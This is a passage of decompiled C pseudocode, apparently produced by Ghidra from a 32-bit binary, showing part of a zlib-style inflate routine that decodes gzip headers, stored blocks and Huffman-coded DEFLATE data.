            *(uint *)(puVar2[8] + 0x14) = uVar12;
          }
          if ((puVar2[4] & 0x200) != 0) {
            local_18 = (char)uVar12;
            local_17 = (undefined)(uVar12 >> 8);
            uVar12 = FUN_1000bf51(puVar2[6],(uint *)&local_18,2);
            puVar2[6] = uVar12;
          }
          uVar13 = 0;
          local_10 = 0;
          local_14 = 0;
        }
        *puVar2 = 5;
switchD_1000a64e_caseD_1000a9d4:
        if ((puVar2[4] & 0x400) != 0) {
          puVar5 = (uint *)puVar2[0x10];
          if (local_8 < (uint *)puVar2[0x10]) {
            puVar5 = local_8;
          }
          if (puVar5 != (uint *)0x0) {
            uVar12 = puVar2[8];
            if ((uVar12 != 0) && (*(int *)(uVar12 + 0x10) != 0)) {
              iVar7 = *(int *)(uVar12 + 0x14) - puVar2[0x10];
              _Size = puVar5;
              if (*(uint *)(uVar12 + 0x18) < (uint)(iVar7 + (int)puVar5)) {
                _Size = (uint *)(*(uint *)(uVar12 + 0x18) - iVar7);
              }
              memcpy((void *)(iVar7 + *(int *)(uVar12 + 0x10)),local_c,(size_t)_Size);
            }
            if ((puVar2[4] & 0x200) != 0) {
              uVar12 = FUN_1000bf51(puVar2[6],local_c,(uint)puVar5);
              puVar2[6] = uVar12;
            }
            local_8 = (uint *)((int)local_8 - (int)puVar5);
            local_c = (uint *)((int)local_c + (int)puVar5);
            puVar2[0x10] = puVar2[0x10] - (int)puVar5;
          }
          if (puVar2[0x10] != 0) break;
        }
        puVar2[0x10] = 0;
        *puVar2 = 6;
        puVar5 = local_8;
LAB_1000aa76:
        if ((puVar2[4] & 0x800) != 0) {
          if (puVar5 != (uint *)0x0) {
            puVar5 = (uint *)0x0;
            do {
              cVar4 = *(char *)((int)puVar5 + (int)local_c);
              puVar5 = (uint *)((int)puVar5 + 1);
              uVar12 = puVar2[8];
              if (((uVar12 != 0) && (*(int *)(uVar12 + 0x1c) != 0)) &&
                 (puVar2[0x10] < *(uint *)(uVar12 + 0x20))) {
                *(char *)(*(int *)(uVar12 + 0x1c) + puVar2[0x10]) = cVar4;
                puVar2[0x10] = puVar2[0x10] + 1;
              }
            } while ((cVar4 != '\0') && (puVar5 < local_8));
            if ((puVar2[4] & 0x200) != 0) {
              uVar12 = FUN_1000bf51(puVar2[6],local_c,(uint)puVar5);
              puVar2[6] = uVar12;
            }
            local_c = (uint *)((int)local_c + (int)puVar5);
            puVar5 = (uint *)((int)local_8 - (int)puVar5);
            local_8 = puVar5;
            if (cVar4 == '\0') goto LAB_1000ab0d;
          }
          break;
        }
        if (puVar2[8] != 0) {
          *(undefined4 *)(puVar2[8] + 0x1c) = 0;
        }
LAB_1000ab0d:
        *puVar2 = 7;
        puVar2[0x10] = 0;
LAB_1000ab1c:
        if ((puVar2[4] & 0x1000) != 0) {
          if (puVar5 != (uint *)0x0) {
            puVar5 = (uint *)0x0;
            do {
              cVar4 = *(char *)((int)puVar5 + (int)local_c);
              puVar5 = (uint *)((int)puVar5 + 1);
              uVar12 = puVar2[8];
              if (((uVar12 != 0) && (*(int *)(uVar12 + 0x24) != 0)) &&
                 (puVar2[0x10] < *(uint *)(uVar12 + 0x28))) {
                *(char *)(*(int *)(uVar12 + 0x24) + puVar2[0x10]) = cVar4;
                puVar2[0x10] = puVar2[0x10] + 1;
              }
            } while ((cVar4 != '\0') && (puVar5 < local_8));
            if ((puVar2[4] & 0x200) != 0) {
              uVar12 = FUN_1000bf51(puVar2[6],local_c,(uint)puVar5);
              puVar2[6] = uVar12;
            }
            local_c = (uint *)((int)local_c + (int)puVar5);
            puVar5 = (uint *)((int)local_8 - (int)puVar5);
            local_8 = puVar5;
            if (cVar4 == '\0') goto LAB_1000abb3;
          }
          break;
        }
        if (puVar2[8] != 0) {
          *(undefined4 *)(puVar2[8] + 0x24) = 0;
        }
LAB_1000abb3:
        *puVar2 = 8;
        uVar12 = local_10;
switchD_1000a64e_caseD_1000abbc:
        if ((puVar2[4] & 0x200) == 0) {
LAB_1000ac1e:
          if (puVar2[8] != 0) {
            *(uint *)(puVar2[8] + 0x2c) = (int)puVar2[4] >> 9 & 1;
            *(undefined4 *)(puVar2[8] + 0x30) = 1;
          }
          puVar5 = (uint *)FUN_1000bf51(0,(uint *)0x0,0);
          *(uint **)(puVar2 + 6) = puVar5;
          param_1[0xc] = puVar5;
          *puVar2 = 0xb;
          puVar5 = local_8;
          uVar12 = local_10;
        }
        else {
          while (uVar13 < 0x10) {
            if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
            puVar5 = (uint *)((int)puVar5 - 1);
            local_14 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << ((byte)uVar13 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            uVar13 = local_14;
            local_10 = uVar12;
            local_8 = puVar5;
          }
          if (uVar12 == (uint)*(ushort *)(puVar2 + 6)) {
            uVar13 = 0;
            local_10 = 0;
            local_14 = 0;
            goto LAB_1000ac1e;
          }
          *(char **)(param_1 + 6) = "header crc mismatch";
          uVar10 = uVar12;
LAB_1000a729:
          *puVar2 = 0x1d;
          puVar5 = local_8;
          uVar12 = uVar10;
        }
        goto LAB_1000ac55;
      case (undefined *)0x1000a94a:
        goto switchD_1000a64e_caseD_1000a94a;
      case (undefined *)0x1000a9d4:
        goto switchD_1000a64e_caseD_1000a9d4;
      case (undefined *)0x1000aa74:
        goto LAB_1000aa76;
      case (undefined *)0x1000ab1a:
        goto LAB_1000ab1c;
      case (undefined *)0x1000abbc:
        goto switchD_1000a64e_caseD_1000abbc;
      case (undefined *)0x1000ac6c:
        _Size = puVar5;
        puVar5 = local_8;
        while (local_8 = puVar5, uVar13 < 0x20) {
          if (_Size == (uint *)0x0) goto LAB_1000b8e2;
          _Size = (uint *)((int)_Size - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          local_10 = uVar12;
          puVar5 = _Size;
        }
        _Size = (uint *)((uVar12 >> 8 & 0xff00) + ((uVar12 & 0xff00) + uVar12 * 0x10000) * 0x100 +
                        (uVar12 >> 0x18));
        *(uint **)(puVar2 + 6) = _Size;
        param_1[0xc] = _Size;
        uVar12 = 0;
        *puVar2 = 10;
        local_10 = 0;
        uVar13 = 0;
        goto LAB_1000acdb;
      case (undefined *)0x1000acd9:
LAB_1000acdb:
        if (puVar2[3] == 0) {
          param_1[3] = local_20;
          param_1[4] = local_1c;
          *param_1 = local_c;
          param_1[1] = puVar5;
          puVar2[0xe] = uVar12;
          puVar2[0xf] = uVar13;
          return 2;
        }
        puVar5 = (uint *)FUN_1000bd21(0,(byte *)0x0,0);
        *(uint **)(puVar2 + 6) = puVar5;
        param_1[0xc] = puVar5;
        *puVar2 = 0xb;
        puVar5 = local_8;
        uVar12 = local_10;
switchD_1000a64e_caseD_1000acfe:
        if ((param_2 == 5) || (param_2 == 6)) break;
switchD_1000a64e_caseD_1000ad12:
        if (puVar2[1] == 0) {
          while (uVar13 < 3) {
            if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
            puVar5 = (uint *)((int)puVar5 - 1);
            bVar9 = (byte)uVar13;
            uVar13 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            local_10 = uVar12;
            local_8 = puVar5;
          }
          uVar10 = uVar12 >> 1;
          puVar2[1] = uVar12 & 1;
          uVar12 = uVar10 & 3;
          if (uVar12 == 0) {
            *puVar2 = 0xd;
          }
          else {
            if (uVar12 == 1) {
              FUN_1000a5a8((int)puVar2);
              *puVar2 = 0x13;
              uVar10 = extraout_EDX;
              if (param_2 == 6) {
                local_10 = extraout_EDX >> 2;
                uVar13 = uVar13 - 3;
                break;
              }
            }
            else {
              if (uVar12 == 2) {
                *puVar2 = 0x10;
              }
              else {
                if (uVar12 == 3) {
                  *(char **)(param_1 + 6) = "invalid block type";
                  *puVar2 = 0x1d;
                }
              }
            }
          }
          uVar12 = uVar10 >> 2;
          uVar13 = uVar13 - 3;
          puVar5 = local_8;
          local_14 = uVar13;
          local_10 = uVar12;
        }
        else {
          *puVar2 = 0x1a;
          uVar12 = uVar12 >> (sbyte)(uVar13 & 7);
          uVar13 = uVar13 - (uVar13 & 7);
          puVar5 = local_8;
          local_14 = uVar13;
          local_10 = uVar12;
        }
        goto LAB_1000ac55;
      case (undefined *)0x1000acfe:
        goto switchD_1000a64e_caseD_1000acfe;
      case (undefined *)0x1000ad12:
        goto switchD_1000a64e_caseD_1000ad12;
      case (undefined *)0x1000adcb:
        uVar10 = uVar13 & 7;
        uVar13 = uVar13 - uVar10;
        local_10 = uVar12 >> (sbyte)uVar10;
        puVar5 = local_8;
        while (local_14 = uVar13, local_8 = puVar5, uVar13 < 0x20) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          puVar5 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          local_10 = local_10 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
        }
        if ((local_10 & 0xffff) != ~local_10 >> 0x10) {
          *(char **)(param_1 + 6) = "invalid stored block lengths";
          uVar10 = local_10;
          goto LAB_1000a729;
        }
        puVar2[0x10] = local_10 & 0xffff;
        uVar12 = 0;
        uVar13 = 0;
        local_10 = 0;
        local_14 = 0;
        *puVar2 = 0xe;
        if (param_2 != 6) goto switchD_1000a64e_caseD_1000ae50;
        break;
      case (undefined *)0x1000ae50:
switchD_1000a64e_caseD_1000ae50:
        *puVar2 = 0xf;
      case (undefined *)0x1000ae56:
        _Size = (uint *)puVar2[0x10];
        if (_Size == (uint *)0x0) {
          *puVar2 = 0xb;
        }
        else {
          if (puVar5 < _Size) {
            _Size = puVar5;
          }
          if (local_1c < _Size) {
            _Size = local_1c;
          }
          if (_Size == (uint *)0x0) break;
          memcpy(local_20,local_c,(size_t)_Size);
          local_c = (uint *)((int)local_c + (int)_Size);
          local_8 = (uint *)((int)local_8 - (int)_Size);
          local_1c = (uint *)((int)local_1c - (int)_Size);
          local_20 = (uint *)((int)local_20 + (int)_Size);
          puVar2[0x10] = puVar2[0x10] - (int)_Size;
          puVar5 = local_8;
          uVar12 = local_10;
        }
        goto LAB_1000ac55;
      case (undefined *)0x1000aead:
        while (uVar13 < 0xe) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          puVar5 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          local_10 = uVar12;
          local_8 = puVar5;
        }
        uVar13 = uVar13 - 0xe;
        puVar2[0x18] = (uVar12 & 0x1f) + 0x101;
        uVar10 = uVar12 >> 10;
        puVar2[0x19] = (uVar12 >> 5 & 0x1f) + 1;
        uVar12 = uVar12 >> 0xe;
        puVar2[0x17] = (uVar10 & 0xf) + 4;
        local_14 = uVar13;
        local_10 = uVar12;
        if ((puVar2[0x18] < 0x11f) && (puVar2[0x19] < 0x1f)) {
          puVar2[0x1a] = 0;
          *puVar2 = 0x11;
          goto switchD_1000a64e_caseD_1000af91;
        }
        *(char **)(param_1 + 6) = "too many length or distance symbols";
LAB_1000a7e3:
        *puVar2 = 0x1d;
LAB_1000ac55:
        uVar10 = *puVar2;
        if (0x1e < uVar10) {
          return -2;
        }
        goto switchD_1000a64e_switchD;
      case (undefined *)0x1000af91:
switchD_1000a64e_caseD_1000af91:
        while (_Size = puVar5, puVar5 = local_8, puVar2[0x1a] < puVar2[0x17]) {
          while (local_8 = puVar5, uVar13 < 3) {
            if (_Size == (uint *)0x0) goto LAB_1000b8e2;
            _Size = (uint *)((int)_Size - 1);
            bVar9 = (byte)uVar13;
            uVar13 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            local_10 = uVar12;
            puVar5 = _Size;
          }
          uVar11 = (ushort)uVar12;
          uVar12 = uVar12 >> 3;
          *(ushort *)((int)puVar2 + (uint)*(ushort *)(&DAT_1000db50 + puVar2[0x1a] * 2) * 2 + 0x70)
               = uVar11 & 7;
          puVar2[0x1a] = puVar2[0x1a] + 1;
          uVar13 = uVar13 - 3;
          local_14 = uVar13;
          local_10 = uVar12;
        }
        while (puVar2[0x1a] < 0x13) {
          *(undefined2 *)
           ((int)puVar2 + (uint)*(ushort *)(&DAT_1000db50 + puVar2[0x1a] * 2) * 2 + 0x70) = 0;
          puVar2[0x1a] = puVar2[0x1a] + 1;
        }
        *(uint **)(puVar2 + 0x13) = puVar2 + 0x14c;
        *(uint **)(puVar2 + 0x1b) = puVar2 + 0x14c;
        puVar2[0x15] = 7;
        local_24 = FUN_1000c244(0,(int)(puVar2 + 0x1c),0x13,(int *)(puVar2 + 0x1b),puVar2 + 0x15,
                                (ushort *)(puVar2 + 0xbc));
        if (local_24 == 0) {
          puVar2[0x1a] = 0;
          *puVar2 = 0x12;
          goto switchD_1000a64e_caseD_1000b1bf;
        }
        *(char **)(param_1 + 6) = "invalid code lengths set";
        goto LAB_1000aff4;
      case (undefined *)0x1000b1bf:
switchD_1000a64e_caseD_1000b1bf:
        while (uVar12 = puVar2[0x1a], uVar12 < puVar2[0x19] + puVar2[0x18]) {
          while (uVar10 = *(uint *)(puVar2[0x13] +
                                   ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & local_10) * 4),
                uVar13 < (uVar10 >> 8 & 0xff)) {
            if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
            local_8 = (uint *)((int)local_8 - 1);
            local_10 = local_10 + ((uint)*(byte *)local_c << ((byte)uVar13 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            uVar13 = uVar13 + 8;
          }
          uVar11 = (ushort)(uVar10 >> 0x10);
          if (uVar11 < 0x10) {
            uVar10 = uVar10 >> 8 & 0xff;
            uVar13 = uVar13 - uVar10;
            local_10 = local_10 >> ((byte)uVar10 & 0x1f);
            *(ushort *)((int)puVar2 + uVar12 * 2 + 0x70) = uVar11;
            puVar2[0x1a] = puVar2[0x1a] + 1;
            local_14 = uVar13;
          }
          else {
            if (uVar11 == 0x10) {
              while (uVar13 < (uVar10 >> 8 & 0xff) + 2) {
                if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                local_8 = (uint *)((int)local_8 - 1);
                bVar9 = (byte)uVar13;
                uVar13 = uVar13 + 8;
                local_10 = local_10 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
              }
              uVar10 = uVar10 >> 8 & 0xff;
              uVar13 = uVar13 - uVar10;
              uVar10 = local_10 >> ((byte)uVar10 & 0x1f);
              if (uVar12 == 0) {
                *(char **)(param_1 + 6) = "invalid bit length repeat";
                local_14 = uVar13;
                local_10 = uVar10;
                goto LAB_1000a729;
              }
              uVar1 = *(undefined2 *)((int)puVar2 + uVar12 * 2 + 0x6e);
              local_10 = uVar10 >> 2;
              iVar7 = (uVar10 & 3) + 3;
              uVar13 = uVar13 - 2;
            }
            else {
              local_14 = uVar10 >> 8 & 0xff;
              if (uVar11 == 0x11) {
                while (uVar13 < local_14 + 3) {
                  if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                  local_8 = (uint *)((int)local_8 - 1);
                  local_10 = local_10 + ((uint)*(byte *)local_c << ((byte)uVar13 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                  uVar13 = uVar13 + 8;
                }
                uVar10 = local_10 >> ((byte)local_14 & 0x1f);
                local_10 = uVar10 >> 3;
                iVar7 = (uVar10 & 7) + 3;
                iVar8 = -3 - local_14;
              }
              else {
                while (uVar13 < local_14 + 7) {
                  if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                  local_8 = (uint *)((int)local_8 - 1);
                  local_10 = local_10 + ((uint)*(byte *)local_c << ((byte)uVar13 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                  uVar13 = uVar13 + 8;
                }
                uVar10 = local_10 >> ((byte)local_14 & 0x1f);
                local_10 = uVar10 >> 7;
                iVar7 = (uVar10 & 0x7f) + 0xb;
                iVar8 = -7 - local_14;
              }
              uVar1 = 0;
              uVar13 = uVar13 + iVar8;
            }
            local_14 = uVar13;
            if (puVar2[0x19] + puVar2[0x18] < iVar7 + uVar12) {
              *(char **)(param_1 + 6) = "invalid bit length repeat";
              *puVar2 = 0x1d;
              break;
            }
            while (iVar7 != 0) {
              *(undefined2 *)((int)puVar2 + puVar2[0x1a] * 2 + 0x70) = uVar1;
              puVar2[0x1a] = puVar2[0x1a] + 1;
              iVar7 = iVar7 + -1;
            }
          }
        }
        puVar5 = local_8;
        uVar12 = local_10;
        if (*puVar2 == 0x1d) goto LAB_1000ac55;
        if (*(short *)(puVar2 + 0x9c) == 0) {
          *(char **)(param_1 + 6) = "invalid code -- missing end-of-block";
        }
        else {
          *(uint **)(puVar2 + 0x13) = puVar2 + 0x14c;
          *(uint **)(puVar2 + 0x1b) = puVar2 + 0x14c;
          puVar2[0x15] = 9;
          local_24 = FUN_1000c244(1,(int)(puVar2 + 0x1c),puVar2[0x18],(int *)(puVar2 + 0x1b),
                                  puVar2 + 0x15,(ushort *)(puVar2 + 0xbc));
          if (local_24 == 0) {
            puVar2[0x14] = puVar2[0x1b];
            puVar2[0x16] = 6;
            local_24 = FUN_1000c244(2,(int)((int)puVar2 + (puVar2[0x18] + 0x38) * 2),puVar2[0x19],
                                    (int *)(puVar2 + 0x1b),puVar2 + 0x16,(ushort *)(puVar2 + 0xbc));
            if (local_24 == 0) {
              *puVar2 = 0x13;
              puVar5 = local_8;
              uVar12 = local_10;
              if (param_2 != 6) goto switchD_1000a64e_caseD_1000b2ac;
              break;
            }
            *(char **)(param_1 + 6) = "invalid distances set";
          }
          else {
            *(char **)(param_1 + 6) = "invalid literal/lengths set";
          }
        }
LAB_1000aff4:
        *puVar2 = 0x1d;
        puVar5 = local_8;
        uVar12 = local_10;
        goto LAB_1000ac55;
      case (undefined *)0x1000b2ac:
switchD_1000a64e_caseD_1000b2ac:
        *puVar2 = 0x14;
      case (undefined *)0x1000b2b2:
        if ((puVar5 < (uint *)0x6) || (local_1c < (uint *)0x102)) {
          puVar2[0x6f1] = 0;
          uVar10 = *(uint *)(puVar2[0x13] + ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & uVar12) * 4);
          while (uVar13 < (uVar10 >> 8 & 0xff)) {
            if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
            local_8 = (uint *)((int)local_8 - 1);
            local_14 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << ((byte)uVar13 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            uVar10 = *(uint *)(puVar2[0x13] + ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & uVar12) * 4
                              );
            uVar13 = local_14;
            local_10 = uVar12;
          }
          cVar4 = (char)uVar10;
          uVar6 = uVar10;
          if ((cVar4 != '\0') && ((uVar10 & 0xf0) == 0)) {
            bVar9 = (byte)(uVar10 >> 8);
            uVar6 = *(uint *)(puVar2[0x13] +
                             ((((1 << (cVar4 + bVar9 & 0x1f)) - 1U & local_10) >> (bVar9 & 0x1f)) +
                             (uVar10 >> 0x10)) * 4);
            uVar13 = local_14;
            if (local_14 < (uVar6 >> 8 & 0xff) + (uVar10 >> 8 & 0xff)) {
              do {
                uVar13 = local_14;
                if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                local_8 = (uint *)((int)local_8 - 1);
                uVar13 = local_14 + 8;
                uVar12 = uVar10 >> 8 & 0xff;
                local_10 = local_10 + ((uint)*(byte *)local_c << ((byte)local_14 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                bVar9 = (byte)uVar12;
                uVar6 = *(uint *)(puVar2[0x13] +
                                 ((((1 << (cVar4 + bVar9 & 0x1f)) - 1U & local_10) >> (bVar9 & 0x1f)
                                  ) + (uVar10 >> 0x10)) * 4);
                local_14 = uVar13;
              } while (uVar13 < (uVar6 >> 8 & 0xff) + uVar12);
            }
            uVar10 = uVar10 >> 8 & 0xff;
            uVar12 = local_10 >> ((byte)uVar10 & 0x1f);
            uVar13 = uVar13 - uVar10;
            puVar2[0x6f1] = uVar10;
          }
          uVar10 = uVar6 >> 8 & 0xff;
          puVar2[0x6f1] = puVar2[0x6f1] + uVar10;
          uVar13 = uVar13 - uVar10;
          uVar12 = uVar12 >> ((byte)uVar10 & 0x1f);
          puVar2[0x10] = uVar6 >> 0x10;
          puVar5 = local_8;
          local_14 = uVar13;
          local_10 = uVar12;
          if ((char)uVar6 == '\0') {
            *puVar2 = 0x19;
            goto LAB_1000ac55;
          }
          if ((uVar6 & 0x20) != 0) {
            puVar2[0x6f1] = 0xffffffff;
            *puVar2 = 0xb;
            goto LAB_1000ac55;
          }
          if ((uVar6 & 0x40) != 0) {
            *(char **)(param_1 + 6) = "invalid literal/length code";
            goto LAB_1000a7e3;
          }
          *puVar2 = 0x15;
          puVar2[0x12] = uVar6 & 0xf;
switchD_1000a64e_caseD_1000b4a9:
          uVar10 = puVar2[0x12];
          if (uVar10 != 0) {
            while (uVar13 < uVar10) {
              if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
              puVar5 = (uint *)((int)puVar5 - 1);
              bVar9 = (byte)uVar13;
              uVar13 = uVar13 + 8;
              uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_10 = uVar12;
              local_8 = puVar5;
            }
            uVar13 = uVar13 - uVar10;
            uVar6 = (1 << ((byte)uVar10 & 0x1f)) - 1U & uVar12;
            uVar12 = uVar12 >> ((byte)uVar10 & 0x1f);
            puVar2[0x10] = puVar2[0x10] + uVar6;
            puVar2[0x6f1] = puVar2[0x6f1] + uVar10;
            local_14 = uVar13;
            local_10 = uVar12;
          }
          puVar2[0x6f2] = puVar2[0x10];
          *puVar2 = 0x16;
switchD_1000a64e_caseD_1000b50c:
          uVar10 = *(uint *)(puVar2[0x14] + ((1 << ((byte)puVar2[0x16] & 0x1f)) - 1U & uVar12) * 4);
          uVar6 = uVar13;
          if (uVar13 < (uVar10 >> 8 & 0xff)) {
            do {
              uVar13 = uVar6;
              if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
              local_8 = (uint *)((int)local_8 - 1);
              uVar13 = uVar6 + 8;
              uVar12 = uVar12 + ((uint)*(byte *)local_c << ((byte)uVar6 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              uVar10 = *(uint *)(puVar2[0x14] +
                                ((1 << ((byte)puVar2[0x16] & 0x1f)) - 1U & uVar12) * 4);
              uVar6 = uVar13;
              local_14 = uVar13;
              local_10 = uVar12;
            } while (uVar13 < (uVar10 >> 8 & 0xff));
          }
          uVar6 = uVar10;
          if ((uVar10 & 0xf0) == 0) {
            bVar9 = (byte)(uVar10 >> 8);
            uVar6 = *(uint *)(puVar2[0x14] +
                             ((((1 << ((char)uVar10 + bVar9 & 0x1f)) - 1U & local_10) >>
                              (bVar9 & 0x1f)) + (uVar10 >> 0x10)) * 4);
            uVar13 = local_14;
            if (local_14 < (uVar6 >> 8 & 0xff) + (uVar10 >> 8 & 0xff)) {
              do {
                uVar13 = local_14;
                if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                local_8 = (uint *)((int)local_8 - 1);
                uVar13 = local_14 + 8;
                uVar12 = uVar10 >> 8 & 0xff;
                local_10 = local_10 + ((uint)*(byte *)local_c << ((byte)local_14 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                bVar9 = (byte)uVar12;
                uVar6 = *(uint *)(puVar2[0x14] +
                                 ((((1 << ((char)uVar10 + bVar9 & 0x1f)) - 1U & local_10) >>
                                  (bVar9 & 0x1f)) + (uVar10 >> 0x10)) * 4);
                local_14 = uVar13;
              } while (uVar13 < (uVar6 >> 8 & 0xff) + uVar12);
            }
            uVar10 = uVar10 >> 8 & 0xff;
            uVar13 = uVar13 - uVar10;
            uVar12 = local_10 >> ((byte)uVar10 & 0x1f);
            puVar2[0x6f1] = puVar2[0x6f1] + uVar10;
          }
          uVar10 = uVar6 >> 8 & 0xff;
          puVar2[0x6f1] = puVar2[0x6f1] + uVar10;
          uVar13 = uVar13 - uVar10;
          uVar12 = uVar12 >> ((byte)uVar10 & 0x1f);
          local_14 = uVar13;
          local_10 = uVar12;
          if ((uVar6 & 0x40) == 0) {
            *puVar2 = 0x17;
            puVar2[0x11] = uVar6 >> 0x10;
            puVar2[0x12] = uVar6 & 0xf;
switchD_1000a64e_caseD_1000b667:
            uVar10 = puVar2[0x12];
            if (uVar10 != 0) {
              if (uVar13 < uVar10) {
                do {
                  if (local_8 == (uint *)0x0) goto LAB_1000b8e2;
                  local_8 = (uint *)((int)local_8 - 1);
                  bVar9 = (byte)uVar13;
                  uVar13 = uVar13 + 8;
                  uVar10 = puVar2[0x12];
                  uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                  local_10 = uVar12;
                } while (uVar13 < uVar10);
              }
              uVar13 = uVar13 - uVar10;
              uVar6 = (1 << ((byte)uVar10 & 0x1f)) - 1U & uVar12;
              uVar12 = uVar12 >> ((byte)uVar10 & 0x1f);
              puVar2[0x11] = puVar2[0x11] + uVar6;
              puVar2[0x6f1] = puVar2[0x6f1] + uVar10;
              local_14 = uVar13;
              local_10 = uVar12;
            }
            *puVar2 = 0x18;
switchD_1000a64e_caseD_1000b6c2:
            if (local_1c == (uint *)0x0) break;
            puVar5 = (uint *)puVar2[0x11];
            if ((uint *)((int)local_2c - (int)local_1c) < puVar5) {
              puVar5 = (uint *)((int)puVar5 - (int)(uint *)((int)local_2c - (int)local_1c));
              if (((uint *)puVar2[0xb] <= puVar5 && puVar5 != (uint *)puVar2[0xb]) &&
                 (puVar2[0x6f0] != 0)) {
                *(char **)(param_1 + 6) = "invalid distance too far back";
                uVar10 = uVar12;
                goto LAB_1000a729;
              }
              if (puVar5 < (uint *)puVar2[0xc] || puVar5 == (uint *)puVar2[0xc]) {
                local_38 = (uint *)((puVar2[0xd] - (int)puVar5) + puVar2[0xc]);
              }
              else {
                puVar5 = (uint *)((int)puVar5 - puVar2[0xc]);
                local_38 = (uint *)((puVar2[0xd] + puVar2[10]) - (int)puVar5);
              }
              _Size = (uint *)puVar2[0x10];
              if (_Size < puVar5) goto LAB_1000b723;
            }
            else {
              local_38 = (uint *)((int)local_20 - (int)puVar5);
              _Size = (uint *)puVar2[0x10];
LAB_1000b723:
              puVar5 = _Size;
            }
            if (local_1c < puVar5) {
              puVar5 = local_1c;
            }
            local_1c = (uint *)((int)local_1c - (int)puVar5);
            *(uint **)(puVar2 + 0x10) = (uint *)((int)_Size - (int)puVar5);
            local_38 = (uint *)((int)local_38 - (int)local_20);
            do {
              *(undefined *)local_20 = *(undefined *)((int)local_38 + (int)local_20);
              local_20 = (uint *)((int)local_20 + 1);
              puVar5 = (uint *)((int)puVar5 - 1);
            } while (puVar5 != (uint *)0x0);
            puVar5 = local_8;
            if (puVar2[0x10] == 0) {
              *puVar2 = 0x14;
            }
            goto LAB_1000ac55;
          }
          *(char **)(param_1 + 6) = "invalid distance code";
          uVar10 = uVar12;
          goto LAB_1000a729;
        }
        param_1[3] = local_20;
        param_1[4] = local_1c;
        *param_1 = local_c;
        param_1[1] = puVar5;
        puVar2[0xe] = uVar12;
        puVar2[0xf] = uVar13;
        FUN_1000c6d0(param_1,local_2c);
        local_20 = param_1[3];
        uVar12 = puVar2[0xe];
        uVar13 = puVar2[0xf];
        local_1c = param_1[4];
        local_8 = param_1[1];
        local_c = *param_1;
        puVar5 = local_8;
        local_14 = uVar13;
        local_10 = uVar12;
        if (*puVar2 == 0xb) {
          puVar2[0x6f1] = 0xffffffff;
        }
        goto LAB_1000ac55;
      case (undefined *)0x1000b4a9:
        goto switchD_1000a64e_caseD_1000b4a9;
      case (undefined *)0x1000b50c:
        goto switchD_1000a64e_caseD_1000b50c;
      case (undefined *)0x1000b667:
        goto switchD_1000a64e_caseD_1000b667;
      case (undefined *)0x1000b6c2:
        goto switchD_1000a64e_caseD_1000b6c2;
      case (undefined *)0x1000b765:
        if (local_1c != (uint *)0x0) {
          local_1c = (uint *)((int)local_1c + -1);
          *(undefined *)local_20 = *(undefined *)(puVar2 + 0x10);
          *puVar2 = 0x14;
          local_20 = (uint *)((int)local_20 + 1);
          goto LAB_1000ac55;
        }
        break;
      case (undefined *)0x1000b78b:
        if (puVar2[2] != 0) {
          while (uVar13 < 0x20) {
            if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
            puVar5 = (uint *)((int)puVar5 - 1);
            bVar9 = (byte)uVar13;
            uVar13 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            local_14 = uVar13;
            local_10 = uVar12;
            local_8 = puVar5;
          }
          local_2c = (uint *)((int)local_2c - (int)local_1c);
          param_1[5] = (uint *)((int)param_1[5] + (int)local_2c);
          puVar2[7] = puVar2[7] + (int)local_2c;
          if (local_2c != (uint *)0x0) {
            if (puVar2[4] == 0) {
              puVar5 = (uint *)FUN_1000bd21(puVar2[6],
                                            (byte *)(uint *)((int)local_20 - (int)local_2c),
                                            (uint)local_2c);
            }
            else {
              puVar5 = (uint *)FUN_1000bf51(puVar2[6],(uint *)((int)local_20 - (int)local_2c),
                                            (uint)local_2c);
            }
            *(uint **)(puVar2 + 6) = puVar5;
